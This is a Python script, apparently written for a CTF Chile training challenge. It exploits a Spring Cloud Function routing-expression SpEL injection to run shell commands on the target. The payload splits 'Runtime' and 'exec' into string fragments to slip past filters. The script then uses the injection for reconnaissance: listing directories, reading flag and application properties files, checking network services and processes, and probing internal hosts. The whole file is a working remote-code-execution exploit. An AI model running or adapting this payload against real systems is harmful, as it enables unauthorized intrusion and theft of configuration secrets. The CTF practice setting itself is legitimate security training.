#!/usr/bin/env python3
"""
CTF Chile - Exploración directa con comandos simples
"""
import requests

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

def simple_cmd(cmd):
    """Ejecutar comando simple"""
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{cmd}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {cmd}")
        if r.text:
            print(f"     → {r.text}")
        return r.status_code
    except Exception as e:
        print(f"[ERR] {cmd}: {e}")
        return 0

print("="*50)
print("EXPLORACIÓN DIRECTA SIMPLE")
print("="*50)

# Comandos básicos de exploración
print("\n[SISTEMA BÁSICO]")
simple_cmd("whoami")
simple_cmd("pwd")
simple_cmd("ls -la")

print("\n[BUSCAR FLAGS DIRECTO]")
simple_cmd("ls /")
simple_cmd("ls /tmp")
simple_cmd("cat /flag.txt")
simple_cmd("cat /root/flag.txt")
simple_cmd("ls /app")

print("\n[ARCHIVOS CREADOS]")
simple_cmd("cat /app/auth.properties")
simple_cmd("cat /app/application.properties")

print("\n[SERVICIOS LOCALES]")
simple_cmd("netstat -tln")

print("\n[CURL SIMPLE]")
simple_cmd("curl -s localhost:8080")
simple_cmd("curl -s 10.160.209.1:8000")

print("\n[BUSCAR PATRONES]")
simple_cmd("strings /app/app.jar | head -20")
simple_cmd("find /app -name '*'")

print("\n[PROCESOS]")
simple_cmd("ps aux | head -10")

print("="*50)